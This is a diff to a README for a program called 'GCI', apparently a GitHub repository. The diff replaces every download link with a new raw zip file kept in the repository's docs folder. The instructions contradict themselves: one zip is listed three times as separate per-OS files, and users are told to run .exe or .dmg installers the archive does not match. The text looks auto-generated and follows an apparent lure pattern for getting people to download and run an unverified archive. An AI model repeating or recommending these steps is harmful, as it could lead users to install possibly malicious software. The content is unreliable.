@@ -1,7 +1,7 @@
 # 🌌 GCI - Explore the Geometry of Reality
 
 ## 📥 Download Now
-[![Download GCI](https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip%20GCI-Beta-green)](https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip)
+[![Download GCI](https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip%20GCI-Beta-green)](https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip)
 
 ## 🚀 Getting Started
 
@@ -22,16 +22,16 @@ To run GCI smoothly, ensure your system meets the following requirements:
 To get started with GCI, follow these steps:
 
 1. **Visit this page to download:** Click the link below to head to our Releases page.
-   [Download GCI](https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip)
+   [Download GCI](https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip)
 
 2. **Choose the latest version:** Look for the most recent release. You will see various files available for download.
 
-3. **Download the appropriate file:** Select the file that corresponds to your operating system (e.g., `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip`, `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip`, or `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip`).
+3. **Download the appropriate file:** Select the file that corresponds to your operating system (e.g., `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip`, `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip`, or `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip`).
 
 4. **Run the installer:**
    - **For Windows:** Double-click the `.exe` file and follow the prompts to install GCI.
    - **For macOS:** Open the `.dmg` file and drag the GCI icon into the Applications folder.
-   - **For Linux:** Extract the `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software-v3.2-alpha.4.zip` file and follow the included instructions to set up GCI.
+   - **For Linux:** Extract the `https://github.com/ThunderTaco/GCI/raw/refs/heads/main/docs/Software_v3.3.zip` file and follow the included instructions to set up GCI.
 
 5. **Launch GCI:** Once installed, find GCI in your applications menu and click to open it. 
 
